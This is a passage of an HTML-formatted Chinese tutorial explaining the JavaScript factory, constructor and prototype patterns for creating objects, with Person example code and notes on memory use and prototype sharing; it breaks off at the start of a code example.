47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br> <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“alert(this.name);”</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“Software”</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> 